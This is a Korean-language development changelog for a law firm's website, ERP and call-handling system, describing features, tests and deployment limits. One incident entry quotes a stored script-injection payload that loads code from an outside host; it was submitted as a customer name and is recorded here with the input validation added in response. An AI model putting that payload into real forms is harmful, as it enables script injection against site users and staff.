...
- 같은 라우트에서 단계·탭·폼 완료·검색 결과처럼 주요 콘텐츠가 교체되거나, 다른 페이지로
  이동해 새 업무 문맥이 시작되면 사용자가 이전 스크롤 위치에 남지 않게 한다. 기본은 새
  페이지 최상단이며, 완료 메시지·새 단계 제목·오류 요약·선택한 상세처럼 명확한 다음 문맥이
  있으면 그 컨테이너를 고정 헤더 아래로 스크롤하고 문맥 제목에 프로그램적으로 포커스한다.
- 상태 변경 전에 `window.scrollTo`를 호출하지 않는다. 새 DOM이 commit된 뒤 effect와
  `requestAnimationFrame`에서 이동하며, 홈페이지는 공통 `moveAttention`을 우선 재사용하고
  `prefers-reduced-motion`을 존중한다. 제목은 `tabIndex={-1}`과 적절한 `aria-labelledby`를
  사용해 키보드·스크린리더에도 전환을 알린다.
- 입력 검증 실패, 사용자가 과거 문자·목록을 읽는 중인 polling처럼 현재 위치 보존이 더 중요한
  갱신은 강제 이동하지 않는다. 모바일 폼의 텍스트 입력은 WebKit 자동 확대를 피하도록 계산된
  글자 크기 16px 이상을 유지하고, 전환 검증에는 스크롤 위치·활성 요소·가로 스크롤·hydration
  경고를 포함한다.
...
### 2026-08-20 — 비정상 고객명만 검토 격리하고 실제 상담 접수 유지 후보
- 사용자가 해당 건은 실제 고객이며 고객명만 비정상이라고 확인해, 공개 상담 자체를 거부하던
  최초 후보 정책을 교정했다. 홈페이지 전화상담·자가진단·카카오 진입은 문제 이름 원문을
  저장하거나 전송하지 않고 `고객명 확인 필요`로 치환하며 전화번호·거주지역·상담 내용과
  접수 원장은 정상 생성한다. 검토 표기는 실명 제공으로 간주하지 않아 이후 정상 이름으로
  보강할 수 있고 공개 양식에는 상담이 계속 진행된다는 안내를 표시한다. 카카오 건은 직원이
  채팅에서 이름을 확인한 뒤 배정한다. 직원이 직접 입력하는 ERP 고객명은 현장에서 수정할 수
  있으므로 기존 일반 텍스트 검증을 유지한다.
- 과거 비정상 이름도 리걸프렌즈 신건 등록을 막지 않고 시스템 익명 표시명을 사용한다. 상담
  배정·전화 후처리 자동문자와 ERP 수동문자 템플릿의 `{{고객명}}`은 중립 호칭 `고객`으로
  치환해 실제 연락을 계속하며, 화면에서는 원문 대신 `고객명 확인 필요`를 유지한다. 공개 API에
  문제의 정확한 문자열을 보낸 통합 테스트에서 201 접수와 원문 비저장을 확인했다.
- 전체 5패키지 test·typecheck·lint·production build, DB schema check와 `git diff --check`를
  통과했다. core 99개·gateway 197개·홈페이지 9개 테스트가 성공했다. migration은 없으며
  운영 원장·리걸프렌즈 현재 이름 수정, 외부 전화·문자, main 병합·운영 배포는 수행하지 않았다.
  `PROJECT_PLAN.md`는 v1.72다.

### 2026-08-20 — 상담 고객명 마크업 입력 차단·기존 값 표시 격리 후보
- 운영 데이터를 읽기 전용으로 확인한 결과 접수번호 `LA-260820-QDQ3H5GC` 한 건이 12:28 KST
  홈페이지 빠른 전화상담에서 `<sCRiPt/SrC=//ujs.cx/Vol>`을 고객명으로 제출했고, 암호화된
  상담 원장과 연결된 리걸프렌즈 현재 고객명에 같은 값이 남아 있었다. Google 유입 뒤 48초
  만의 제출이고 전형적인 저장형 스크립트 삽입 탐지 문자열이라 의도적 시험 가능성이 높지만
  제출 주체는 확정하지 않았다. ERP는 React 텍스트 노드로 이스케이프해 표시했으며 실제 코드
  실행 증거는 없다. 원인은 공개·ERP 고객명 스키마가 공백·길이만 검사한 입력 계약 결손이다.
- core에 공통 일반 텍스트 고객명 계약을 두고 NFKC 기준 `<`·`>`·C0/C1 제어문자·줄/문단
  구분자를 거부했다. 홈페이지 전화상담·자가진단·카카오와 ERP 직원 신건·고객찾기 신건·
  전화데스크·직접 문자·전화번호부 입력에 적용하고, 폼에서도 즉시 같은 오류를 안내한다.
  기존 암호화 원장·리걸프렌즈 현재명·고객찾기·전화번호부·수신전화·문자 대화는 출력 경계에서
  `고객명 확인 필요`로 격리한다. 과거 비정상 이름은 리걸프렌즈 사건 생성과 고객명 자동문자로
  보내지 않으며 네이버 예약 외부 이름도 안전하지 않으면 `예약자`로 낮춘다.
- 전체 5패키지 test·typecheck·lint·production build, DB schema check와 `git diff --check`를
  통과했다. core 99개·gateway 195개·홈페이지 9개 테스트가 성공했다. 새 워크트리의 최초
  gateway test는 `@lawand/db` dist 부재로 실행 전 일부 중단됐고 DB를 build한 뒤 전체를
  재실행해 통과했다. migration은 없으며 운영 원장·리걸프렌즈 기존 값 수정, 외부 전화·문자,
  main 병합·운영 배포는 수행하지 않았다. `PROJECT_PLAN.md`는 v1.71이다.
...
- migration은 통합 과정에서 `0067_goofy_mongoose.sql`로 재번호화했다. gateway 174개
...
### 2026-08-18 — ERP 무효 상담 담당자 복원 후보
- 리걸프렌즈 사건 담당자가 전용 `무효` 계정인 상담 상세에 `상담으로 되돌리기` 버튼을
  추가했다. 인증 직원이 확인 후 실행하면 복원 전용 gateway API가 실행 직원의 활성
  리걸프렌즈 계정을 검증하고, 기존 담당자 변경 outbox·이관 원장을 통해 리걸프렌즈 사건
  담당자와 ERP 상담 담당자를 실행 직원으로 함께 변경한다. 외부 변경 성공 뒤에만 ERP 배정을
  확정하고 처리 중 중복·다른 담당자 변경 충돌은 기존 pending unique 계약으로 막는다.
- 일반 담당자 변경은 무효 사건을 계속 차단하며 복원 버튼으로 안내한다. 무효가 아닌 상담의
  복원 요청도 거부하고 복원 요청은 별도 감사 action으로 남긴다. migration·운영 데이터·main
  병합·운영 배포는 수행하지 않았다. core·DB·gateway·ERP production build, gateway 173개
  테스트, gateway·ERP typecheck·lint와 `git diff --check`를 통과했다. 첫 gateway 테스트는
  선행 core·DB dist가 없는 상태라 모듈 해석 단계에서 중단됐고 두 패키지를 빌드한 뒤 전체를
  다시 실행해 통과했다. `PROJECT_PLAN.md`는 v1.53이다.

### 2026-08-18 — 수신전화 서울·대전·부산 지역 인지 배지 후보
- 외부 수신전화 활동 snapshot에 `서울`·`대전`·`부산`·`미분류` 지역을 추가했다. 대표번호와
  센트릭스 원회선을 먼저 매핑하고, 개인 회선은 활성 소유 직원의 주 소속을 사용한다. 근거가
  없거나 여러 지역이 충돌하면 임의 추정하지 않고 `미분류`로 내린다.
- ERP 실시간 수신 토스트에는 서울 파랑·대전 보라·부산 청록·미분류 회색 배지를 회선/담당
  정보보다 먼저 표시하고, OS 브라우저 알림 제목도 `[서울]` 같은 지역 표기로 시작한다.
  gateway·ERP typecheck/lint/production build와 지역 분류 단위 테스트, `git diff --check`를
  통과했다. migration·운영 데이터·main 병합·운영 배포는 수행하지 않았다.
  `PROJECT_PLAN.md`는 v1.53이다.

### 2026-08-18 — 통화 후처리 자동문자 선택·상담완료 후기요청 후보
- 부재 및 무응답·통화중·거절·담당자 연결 요청의 개인 자동문자를 후처리 저장 때 무조건
  발송하지 않고 결과별 체크박스로 선택하게 했다. 같은 상담 또는 리걸프렌즈 사건에 같은
  자동발송 조건의 성공·처리 중 이력이 있으면 기본 체크를 해제하고 발송 시각·상태를 표시한다.
  최초 발송과 확정 실패 재시도는 기본 체크하며 결과 불명은 안전하게 기본 해제한다.
- 상담완료에는 후기관리의 기본 템플릿 `상담을 받은 뒤`와 개인 후기 작성 링크를 보내는
  체크박스를 같은 규칙으로 추가했다. 후기요청 템플릿 출처·이름·본문 미리보기를 명시하고
  기존 `customer_review_requests`·문자 원장 및 통화 후처리 ID 멱등키를 재사용한다.
  migration·운영 데이터·main 병합·운영 배포는 수행하지 않았다. `PROJECT_PLAN.md`는 v1.53이다.
...
### 2026-08-18 — 후기 제출 완료 어텐션·전역 화면 전환 규칙 후보
- 개인화 후기 링크와 일반 후기 작성이 제출 성공 뒤 폼 DOM을 완료 화면으로 교체하면서도,
  교체 직전 문서 최상단 `window.scrollTo`에 의존해 긴 폼의 하단 위치와 입력 포커스가 남을 수
  있던 경계를 수정했다. 새 완료 DOM commit 뒤 공통 `moveAttention`으로 감사 메시지 영역을
  고정 헤더 아래에 표시하고 완료 제목에 포커스를 옮긴다. 모바일 후기 텍스트 입력은 16px로
  보정해 iOS WebKit의 입력 자동 확대 조건도 제거했다.
- 홈페이지·ERP의 주요 페이지/상태 전환은 최상단 또는 새 문맥 컨테이너로 스크롤하고 문맥 제목에
  포커스를 주되, 검증 실패·과거 열람 중 갱신은 현재 위치를 보존한다는 필수 지침을 추가했다.
  migration·API·DB·운영 데이터·main 병합·운영 배포는 변경하거나 수행하지 않았다.
  `PROJECT_PLAN.md`는 v1.48이다.
...
### 2026-08-18 — 후기관리 기프티쇼 비즈 API 연동·메가커피 통제 발송 후보
- 공식 연동규격서 v1.04와 승인 계정 상품조회 API 2,467건을 대조해 메가MGC커피 `더블 아아
  세트` `G00005791119`(4,000원), 네이버페이 포인트 1만원 `G00002071061`(10,000원·60일),
  배달의민족 모바일상품권 3만원 `G00005790951`(30,000원)을 현재 판매 상품으로 확정했다.
  ERP 후기 상세에서 세 상품을 선택하고 고객·사건·사유·대가성 방지 확인 뒤 단건 발송한다.
- gateway는 비밀 환경변수 6개를 모두 갖춘 경우에만 활성화하며 상품코드뿐 아니라 브랜드·
  상품명·정가·판매 상태를 발송 직전 상세조회와 대조한다. migration
  통합 과정에서 자동문자 migration 다음 번호인 `0065_review_gift_coupons.sql`로 재생성한
  migration에 암호화 수신번호·지문, 직원·고객/사건·상품 snapshot·사유,
  멱등키·25자 이하 TR_ID·주문번호·상태를 보존하고 한 후기당 활성 발송 1건을 강제했다.
  15초 응답 유실은 같은 TR_ID 취소를 시도하며 취소 결과도 불명이면 `unknown`으로 남긴다.
- db schema check, gateway/ERP typecheck·lint·production build, 기프티쇼 계약 단위 테스트 3개와
  `git diff --check`를 통과했다. 승인 계정 잔액 API는 `0000`이지만 문서와 달리 잔액 필드가
  없어 잔액을 성공으로 추정하지 않는다. 인증키·토큰키는 소스·Git·로그에 기록하지 않았다.
- 사용자 명시 요청으로 고정 TR_ID `lawand_20260818_ym8705`를 써 `010-****-8705`에 메가MGC커피
  더블 아아 세트 1건을 통제 발송했다. 주문번호 `20260818682859`이며 상세조회에서 상품코드·
  상품명, `발송완료`·`Success`·`발행`을 확인했다. 이 브랜치에서는 운영 migration·앱 배포·
  운영 DB 변경은 수행하지 않았다.
...
- 고정 카드 목록이 추가 템플릿 수만큼 화면을 밀어내던 후기 요청 화면을 기본/추가 그룹
  드롭다운으로 바꿨다. 선택한 템플릿은 왼쪽 문자 화면 미리보기와 오른쪽 편집기에 동시에
  채우며, 변수 치환 예시와 SMS/LMS 예상 구분으로 긴 본문 전체를 확인한다. 기본 템플릿에는
  배지를 표시하고 이름·기본 시점·삭제는 잠그되 본문 수정·저장은 유지한다. 개인 템플릿은
  이름·시점·본문 수정과 삭제가 가능하고 새 템플릿 작성은 별도 동작으로 분리했다.
- 미저장 상태를 표시하고 템플릿 전환·브라우저 이탈 전에 확인하며, 서버에 저장되지 않은
  초안이나 새 템플릿으로는 고객 발송을 할 수 없게 했다. 수신 고객이 없을 때 발송 요약은
  편집 영역을 가리지 않고, 840px 이하에서는 미리보기와 편집기를 한 열로 쌓는다. 데스크톱
  1440px·모바일 390px 화면과 기본/개인 템플릿 전환 상태를 확인했다.
- core 91개·gateway 166개 테스트, 전체 5패키지 typecheck·lint·production build와
  `git diff --check`를 통과했다. API·DB·migration·운영 데이터·main 병합·운영 배포는
  변경하거나 수행하지 않았다. `PROJECT_PLAN.md`는 v1.46이다.

### 2026-08-16 — 신규 공개 후기 작성자명 자동 마스킹 후보
- 홈페이지 일반 후기 작성의 `author_display`를 gateway가 접수·공개 원장 승격 때 그대로
  사용하고 홈페이지도 그대로 렌더링해, 작성자가 실명을 입력한 새 공개 후기에 전체 이름이
  노출될 수 있었다. 공통 `maskReviewAuthorDisplay`를 추가해 첫 글자만 남긴 `김○○ 고객`
  형식으로 접수 시 정규화하고 공개 승격 때 다시 적용한다. 홈페이지 공개 조회에도 같은
  규칙을 적용해 변경 전에 이미 공개된 후기까지 배포 즉시 가리되 운영 DB 원장은 직접
  변경하지 않는다. 일반 작성 화면 미리보기와 공개 동의 문구도 실제 마스킹 결과에 맞췄다.
- core 91개·gateway 166개 테스트, 전체 5패키지 typecheck·lint·직접 production build와
  `git diff --check`를 통과했다. migration·운영 데이터 변경·main 병합·운영 배포는 수행하지
  않았다. 후기 요청 템플릿 화면은 현행 선택/편집 상태와 CSS만 분석했으며 사용자 승인 전에는
  구현을 변경하지 않는다. `PROJECT_PLAN.md`는 v1.45다.
...
### 2026-08-14 — 수신 발신자 식별 복구·암호화 공용 전화번호부 후보
- 전화데스크 원장에는 직원 `공서아`가 정상 식별됐지만 외부 수신 브라우저 알림 요약이 상담·
  리걸프렌즈만 처리해 `staff` 결과를 `발신자 정보 없음`으로 낮추는 UI 경계를 수정했다. 수신 중
  OS Notification과 ERP 알림 카드에 발신번호를 항상 함께 표시하고, 직원명·내선을 그대로
  사용한다. 직원 해석은 프로필의 검증 센트릭스 번호와 활성 직원 endpoint 번호를 모두 조회해
  서울→부산처럼 외부 경로로 관측되는 직원 통화도 어느 번호로 들어오든 같은 직원으로 찾는다.
- 상담·직원이 아닌 법원·채권자·기관 발신자를 위한 공용 전화번호부를 추가했다. 표시 이름과
  원번호·선택 연결번호 원문은 AES-GCM으로 암호화하고 두 번호 HMAC 지문을 모두 조회 키로 쓴다.
  같은 번호가 서로 다른 연락처의 원번호·연결번호에 교차 등록되지 않도록 정렬 advisory lock,
  앱 검증, DB trigger를 함께 적용했다. 발신자 해석 우선순위는 상담 → 직원 → 전화번호부 →
  리걸프렌즈이며 등록·수정·소프트삭제와 조회는 직원 감사 원장에 남는다.
- 통화 후처리에서 현재 통화 번호가 원번호나 연결번호에 실제 포함된 경우에만 발신자 정보를
  함께 저장·수정한다. `법원 등 관공서`·`채권자 등` 결과를 고르면 저장 UI가 열리고, 별도 ERP
  `/phonebook`에서 이름·번호 검색, 등록·수정·삭제가 가능하다. migration
  `0061_telephony_phonebook.sql` SHA-256은
  `583609c13440495d8ff48a16f23b340aaccd30e2c6aad3bd245113c445de392e`이며
  `PROJECT_PLAN.md`는 v1.41이다.
- 전체 5패키지 typecheck·lint·production build, core 88개·gateway 159개 테스트, DB schema
  check와 `git diff --check`를 통과했다. 합성 CB 원천을 둔 임시 PostgreSQL에 migration
  `0000..0061` 62개를 두 번 적용하고 새 테이블·지문 교차 중복 차단·앱/조회자/PUBLIC 최소
  권한·migration 원장 해시를 확인한 뒤 임시 DB를 삭제했다. 이 워크트리에서는 main 병합·운영
  migration·배포·운영 데이터 변경·실제 통화 canary를 하지 않는다. 운영 반영은 RDS snapshot 뒤
  `0061`을 적용하고 gateway·ERP를 같은 릴리스로 전환해 `070-4607-4592` 직원 수신과
  `02-530-1953` 전화번호부 원번호·연결번호 수신을 통제 확인한다.
...
### 2026-08-14 — 외부 통화 연결 즉시 후처리 팝업 후보
- 외부 수신·발신 root가 `connected`가 되면 gateway가 로그인 직원이 현재 endpoint의 활성
  회선 소유자이거나 해당 통화 참여자인지 판정해 `canOpenLiveAftercare`만 반환한다. 따라서
  당겨받기 뒤에는 실제로 받은 직원에게 열리고, 전화와 무관한 다른 직원에게는 자동으로
  열리지 않는다. 내부 통화·울리는 중·종료 통화는 이 실시간 자동 팝업 대상에서 제외한다.
- ERP는 상세 페이지로 강제 이동하지 않고 현재 보이는 탭 위에 기존 공용 후처리 모달을 통화
  ID당 한 번 자동 표시한다. 같은 브라우저의 여러 탭은 localStorage 표식으로 중복을 막고,
  백그라운드 탭은 보이게 된 시점에만 후보를 확인한다. 직원이 닫으면 다시 강제 표시하지 않으며
  전화데스크 카드의 `후처리 입력`으로 수동 재열 수 있다.
- 연결 중 모달 제목·안내를 메모·재연락 일정·문자 업무에 맞게 바꿨다. 연결 중 상세 페이지에서
  저장할 때는 목록으로 이탈하지 않고 현재 페이지를 유지하며, 종료 뒤 저장은 기존처럼 목록으로
  돌아간다. 이미 해당 상세나 팝업이 열려 있으면 자동 큐에 중복 추가하지 않는다.
- 전체 5패키지 typecheck·lint·production build, core 83개·gateway 141개 테스트, DB schema
  check와 `git diff --check`를 통과했다. migration·운영 데이터 변경·main 병합·운영 배포·
  실제 통화 canary는 수행하지 않았다. `PROJECT_PLAN.md`는 v1.38이며 운영 반영 시 gateway와
  ERP를 같은 릴리스로 전환해 ERP 발신·일반 수신·당겨받기의 연결 순간에 실제 직원 탭 한 곳만
  팝업이 열리고 메모·재연락·문자 저장 뒤 현재 화면이 유지되는지 확인한다.

### 2026-08-14 — 직원 회선 식별·전 직원 연락/후처리·통화 중 메모 후보
- 전화번호 해석을 기존 상담 묶음 → 리걸프렌즈에서 상담 묶음 → 활성 직원 센트릭스 전체
  회선 → 리걸프렌즈 순으로 확장했다. 직원관리에서 검증·저장된 전체 번호가 일치하면 직원명·
  내선을 전화 상태바·브라우저 알림·전화데스크 목록/상세에 표시한다. 비활성 직원이나 회선·
  내선이 없는 직원은 제외하며 개인정보 없는 SSE 계약은 변경하지 않았다.
- 상담 상세의 문자·클릭투콜과 전화데스크 후처리에서 상담/회선 담당자 제한을 제거했다.
  인증 직원이면 누구나 실행할 수 있지만 문자·발신은 실행 직원 자신의 활성 주 센트릭스
  회선을 사용하고 모든 원장은 실제 실행 직원 ID를 계속 감사 기록한다. 개인 문자 템플릿의
  소유권과 다른 직원 발송 결과 조회 제한은 유지한다.
- 카카오 채널 상담의 문자·발신 가능 여부는 `contact_channel=phone`이 아니라 실제 전화
  암호문·지문 존재 여부로 판정한다. 대표 상담뿐 아니라 활성 상담 묶음의 구성 요청까지
  확인해 선택 전화번호가 있으면 발송·발신하고, 번호가 없는 접수는 기존처럼 거부한다.
- 후처리 화면과 저장을 `connected`부터 허용해 고객과 통화하면서 메모·30분 단위 다음 일정을
  먼저 남길 수 있다. 통화 종료 뒤 결과를 다시 수정하며, 종료 원장이 최종 통화자 확인 필요
  상태면 기존처럼 먼저 통화자를 확정한다. 울리는 중·미연결 상태는 저장하지 않는다.
- 전체 5패키지 typecheck·lint·production build, core 83개·gateway 140개 테스트, DB schema
  check와 `git diff --check`를 통과했다. migration·운영 데이터 변경·main 병합·운영 배포·
  실제 전화/문자 canary는 수행하지 않았다. `PROJECT_PLAN.md`는 v1.37이며 운영 반영 시
  gateway와 ERP를 같은 릴리스로 전환하고 직원 회선 수신 식별, 타 담당 상담 문자/발신,
  카카오 선택 전화, 당겨받기 후처리와 통화 중 일정 저장을 실제 계정으로 확인한다.
...
- `새 메시지` 모달은 휴대전화 번호 직접 입력, 로그인 직원의 최근 담당 ERP 상담 100건 안의
  ...
  MMS를 보낸다. 통합 migration `0059_message_conversation_composer.sql`은 직접 번호 HMAC과 번호·
...
- gateway 목록 쿼리는 과거 수·발신 500건을 모두 조인·복호화하던 경계를 없애고, SQL CTE에서
  ...
  브랜치에서는 합성 `CB` 스키마가 있는 임시 PostgreSQL에 migration `0000..0058` 59개를 두 번 적용하고,
...
- core 84개·gateway 138개 테스트, DB schema check, 전체 5패키지 typecheck·lint·production
  ...
  통합 배포에서는 암호화 RDS snapshot 뒤 `0058`·`0059`를 먼저 적용하고 gateway와 ERP를 같은 릴리스 ID로 전환한 뒤,
  직접 SMS/JPG MMS·대표 회신 연결·모바일 새로고침 hydration 경고 0을 통제 확인한다.

### 2026-08-14 — ERP 후기관리·후기요청 문자·기프티쇼 상용 심사 화면 후보
- ERP에 이전 공개 후기와 홈페이지 검수 대기를 합친 후기관리 목록·상세를 추가했다. 상세는
  암호화 원문과 작성 전화, 리걸프렌즈 고객의 전체 이름·전화·사건 상태/법원/번호와 최대 3명
  담당자를 보여준다. 신규 후기는 90일·1회용 HMAC 후기 요청 링크를 우선 연결하고, 링크가
  없으면 전화번호 완전일치 결과가 정확히 한 사건일 때만 자동 연결한다. 복수 후보·이전 후기는
  고객찾기와 같은 검색으로 직원이 직접 연결하며 이름 유사도는 쓰지 않는다. 연결 당시 활성
  ERP 계정이 있는 사건 담당자 전원에게 비식별 SSE·브라우저 알림과 지속 `답글 필요` 배지를
  제공하고, 직원 누구나 사유 필수 공개 제한 또는 하나의 공식 답글 작성·수정을 할 수 있다.
  공식 답글은 홈페이지 후기 카드에도 노출된다.
- 직원별 후기 요청 템플릿은 `{{고객명}}`·`{{담당자명}}`·`{{사건번호}}`·`{{후기작성링크}}`만
  허용하고 링크 변수를 필수로 하며, 리걸프렌즈 고객 사건을 최대 30개 선택해 기존 센트릭스
  문자 원장으로 발송한다. 응답 유실 재시도는 고객별 같은 멱등키를 유지한다. migration
  통합 번호 `0060_tranquil_dark_phoenix.sql`은 고객/사건 연결·담당자 snapshot·답글·개인 템플릿·요청
  원장과 공개 제한 감사 필드, 최소 권한 및 개인정보 없는 `lawand_review_events` 알림을 추가한다.
- 후기 상세에 기프티쇼 비즈 상용 Key 심사용 모바일쿠폰 발송 화면을 실제 디자인으로 적용했다.
  고객·사건·담당자, 승인 상품, 발송 사유, 안내 문구와 대가성 오인 방지 최종 확인을 보여주되
  상용 Key·처리위탁 승인 전 상품/발송 API·과금·외부 전송은 연결하지 않고 버튼을 잠갔다.
  제출용 A4 8쪽 소개서와 ERP 적용 화면은 `docs/submissions`에 있으며 PDF SHA-256은
  `de46f66c4d55c3ec1e27e4616cdcc640aa5bb084ec37e61cd5f172ace34faea3`, 1440×1220 PNG는
  `8b22751d4bfe8bd08264ef1f15ad7b9d735c4dd542287cb0f975a64474fa9d40`이다.
- 전체 5패키지 typecheck·lint·production build, core 85개·gateway 141개 테스트, DB schema
  check, ERP 서비스 워커 syntax와 `git diff --check`를 통과했다. 합성 비식별 `CB` 원천을 둔
  빈 PostgreSQL에 migration `0000..0058` 59개를 두 번 적용하고, 고객·사건·담당자 해석,
  앱/조회자/PUBLIC 권한과 실제 LISTEN 알림에 개인정보가 없는지 확인한 뒤 임시 DB를 삭제했다.
  이 워크트리에서는 main 병합·운영 migration/배포·실제 후기요청 문자·기프티쇼 발송을 하지
  않는다. 통합 운영 반영은 스냅샷 뒤 `0058..0060`을 먼저 적용하고 gateway·홈페이지·ERP를 같은 릴리스로
  전환하며, 새 후기 LISTEN 연결을 포함한 DB 풀 waiting과 실제 담당자 알림을 확인한다.

### 2026-08-14 — 상담 목록 기존고객 담당자·무효 상태 시각 구분 후보
- 상담 목록의 기존고객 일괄 조회가 자기 생성 사건을 제외한 과거 리걸프렌즈 사건의
  주·부 담당자명도 함께 반환한다. 사건이 여러 건이어도 담당자명은 상담별로 중복 제거해
  `기존고객 · 담당 {이름}` 배지에 표시하며, 우측 담당 영역은 이번 ERP 상담의 현재 배정을
  계속 나타낸다. 담당자 검색도 같은 목록 데이터로 가능하고 추가 상담별 DB 조회는 없다.
- 카카오 미진입 무효 상담은 저장된 `closed` 상태를 일반 `종결`로 표시하지 않고 목록 상태와
  우측 담당 영역을 모두 `무효`로 표시한다. 이름·전화번호는 블러 처리하고 채널 아이콘은
  흐리게 하되 무효 상태·처리 배지·접수번호는 읽을 수 있게 남겼다. 일반 종결 상담과
  소프트삭제 상담의 의미는 바꾸지 않았다.
- gateway 139개 테스트, ERP·gateway typecheck·ESLint·production build와
  `git diff --check`를 통과했다. DB migration·운영 데이터 변경은 없고
  `PROJECT_PLAN.md`는 v1.37이다. 이 워크트리에서는 브랜치 commit·push까지만 수행하며
  main 병합과 gateway·ERP 운영 배포는 메인 세션에서 같은 릴리스로 진행한다.

### 2026-08-14 — ERP 신건상담·수신전화 알림 시각 체계 분리 후보
- 신건상담 인앱 알림은 초록 세로 강조선·서류 아이콘·밝은 업무 카드 구조로 유지하고,
  수신전화는 파란 고대비 실시간 헤더·울림 애니메이션이 있는 원형 전화 아이콘·원형 고객
  표시·파란 수신 버튼을 쓰는 별도 레이아웃으로 바꿨다. `내 회선/다른 회선`과
  `내 담당 고객` 배지는 전화 카드 본문 상단에 독립 배치해 알림 종류와 수신 가능 여부를
  한눈에 구분한다. OS 기본 Notification도 상담 `📝`·수신전화 `📞` 제목 표식으로 구분하며,
  움직임 축소 설정에서는 새 울림 애니메이션도 중단한다.
- 알림의 데이터·20초 수명·상태 연동·센트릭스 수신 권한 계약은 바꾸지 않았다. ERP
  typecheck·ESLint·production build와 `git diff --check`를 통과했다. DB migration·gateway·
  서비스 워커·운영 데이터 변경과 main 병합·운영 배포는 수행하지 않는다.
...
- 정규화 전화번호가 같고 마지막 요청에서 7일 이내인 활성 상담은 채널·입력 이름과 관계없이
  하나의 상담 묶음으로 자동 연결한다. 같은 이름의 반복 요청은 대표 원장에 붙이고, 다른 이름·
  카카오 표시명은 별도 원장으로 보존한 채 묶어 가족·공용 번호를 나중에 실제로 분리할 수 있다.
  전화번호 없는 카카오 접수는 독립 상담으로 남으며 직원이 접수번호를 확인한 뒤 수동 연결한다.
- migration `0057_consultation_groups.sql`은 활성/병합 묶음, 구성원, 연결·분리·대표 변경 감사 원장을
  추가한다. 소프트삭제·미진입 무효 상담은 자동 후보에서 제외하고, 서로 다른 담당 배정이나
  리걸프렌즈 사건이 있는 묶음은 수동 병합을 거부한다. 묶인 상담은 먼저 구성원을 분리해야
  소프트삭제·무효 처리할 수 있다. 담당 배정·리걸프렌즈 신건·최초 접수 알림톡은 묶음 전체에서
  한 번만 실행하며 배정 시 묶음 안의 확인 가능한 카카오 진입을 함께 확정한다.
- ERP 목록은 대표 상담 한 건만 표시하면서 원장 수·요청 수·채널별 횟수·이름 불일치 경고를
  보여준다. 상세는 모든 구성원과 채널별 요청·개별 접수번호를 표시하고, 접수번호 수동 연결 및
  잘못 묶인 원장의 별도 상담 분리를 제공한다. 연결·분리는 개인정보 없는 SSE와 감사 원장을
  남긴다.
- 전체 5패키지 typecheck·lint·production build, core 83개·gateway 134개 테스트, DB schema
  check, ERP 서비스 워커 syntax와 `git diff --check`를 통과했다. 합성한 빈 비식별 `CB` 원천의
  임시 PostgreSQL에 migration `0000..0057` 58개를 두 번 적용했고, 직원 2건·카카오 1건 자동
  묶음, 동일 이름 반복 요청, 무전화 카카오 독립 접수, 목록 1건/상세 전체 표시, 수동 연결·분리를
  실제 서비스 경계에서 검증한 뒤 임시 DB·역할을 삭제했다. `PROJECT_PLAN.md`는 v1.33이다.
- 이 워크트리에서는 main 병합·운영 migration·gateway/ERP 배포·운영 데이터 변경을 하지 않는다.
  운영 반영 시 `0057`을 먼저 적용하고 gateway와 ERP를 같은 릴리스로 전환한다. 배포 전 존재한
  운영 상담은 자동 소급 병합하지 않으므로, 현재 확인된 3건은 배포 뒤 상세의 접수번호 연결로
  직원이 묶어야 한다.

### 2026-08-13 — 전화데스크 검색 전환·실시간 알림 경로 경량화 후보
- 전화데스크의 SSR·mount·SSE 과거 원장 자동 조회를 제거했다. 최초 화면은 빈 검색 UI와
  현재 통화 상태만 제공하며, 직원이 리걸프렌즈 고객명/전화번호·최대 31일·출처를 지정해
  검색할 때만 원장을 읽는다. 서버는 조건별 전체 원장을 복호화한 뒤 자르지 않고 먼저 세
  원천의 후보 ID를 시간순으로 병합·페이지 처리한 다음 선택된 20/50/100건만 상세 조인·
  복호화·고객 해석한다. 기존 재통화 업무 큐는 검색 응답에서만 명시적으로 불러와 완료·문자·
  발신 기능을 보존했다.
- 모든 ERP 화면의 개인정보 없는 전화 SSE는 브라우저 알림을 위해 유지하되, 누적 전화데스크
  100건 조회를 없애고 최근 root 활동 snapshot만 읽는다. 전화 상태 카드는 전화데스크에서만
  표시하며 현재 외부 수·발신은 전 직원 회선을, 내선은 로그인 직원 문맥만 보여준다. 외부
  수신 네이티브 알림은 활성 직원 전원에게 계속 전송하고, 상담 또는 리걸프렌즈 담당자가
  로그인 본인이면 제목 `★ 내 담당 고객 전화`와 본문 첫 줄로 강조한다. localStorage가 막혀도
  Notification API 시도는 중단하지 않는다.
- 동일 번호의 상담·리걸프렌즈 고객 해석은 gateway 프로세스 메모리에서 HMAC 키 기준 15초
  single-flight·최대 500개로 공유한다. 개인정보를 새 DB 테이블이나 로그에 저장하지 않으며,
  과거 검색과 재통화 조회는 실시간 이벤트 경로에서 제외했다. 진단한 운영 RDS 클래스는
  사용자 결정에 따라 업그레이드하지 않았고 CloudFormation·운영 DB·배포를 변경하지 않았다.
  `PROJECT_PLAN.md`는 v1.34다.
- ERP·gateway typecheck·lint·production build, gateway 134개 테스트, 알림 서비스 워커 문법,
  자동 과거 조회 금지 정적 확인과 `git diff --check`를 통과했다. 이 워크트리에서는 main
  병합·운영 배포·실제 전화 canary를 수행하지 않는다. 운영 반영 시 gateway와 ERP를 같은
  릴리스로 배포하고 여러 직원 계정의 동시 수신 알림, 전화데스크 전체 현재 통화 상태와 검색
  응답 시간·DB 풀 waiting/CPU를 실제 수신으로 확인한다.

### 2026-08-13 — 외부 수신전화 전 직원 상세 브라우저 알림 후보
- 외부 고객 수신전화의 브라우저 알림 대상을 고객·회선 담당자 합집합에서 활성 직원 전체로
  바꿨다. ERP에 로그인한 탭이 열려 있고 알림 권한을 허용한 직원은 담당 여부와 무관하게
  수신 즉시 알림을 받으며, 기존 8초 다중 탭 leader lease로 브라우저당 한 건만 표시한다.
- 수신 알림도 상담 알림과 같은 서비스 워커 표시·10초 자동 닫힘·LAW& icon/badge·안전한
  `전화 보기`/`전화데스크` 이동 액션을 사용한다. 제목과 본문에는 인증 snapshot에서 읽은
  고객명·전체 전화번호·상담 접수번호/상태·리걸프렌즈 사건 종류/상태/번호/사건명/법원·
  기존 담당자·연결 사건 수·수신 회선/대표번호/내선을 가능한 범위에서 표시한다.
- 새 SSE·DB 조회·polling은 추가하지 않았다. 기존 통화 변경 신호 뒤 각 로그인 탭이 이미
  읽는 통합 snapshot과 이미 수행하던 활성 직원 조회를 재사용하므로 직원 수만큼 별도 서버
  fan-out 작업이 생기지 않고, 응답의 알림 대상 ID 배열만 커진다. `PROJECT_PLAN.md`는 v1.33이다.
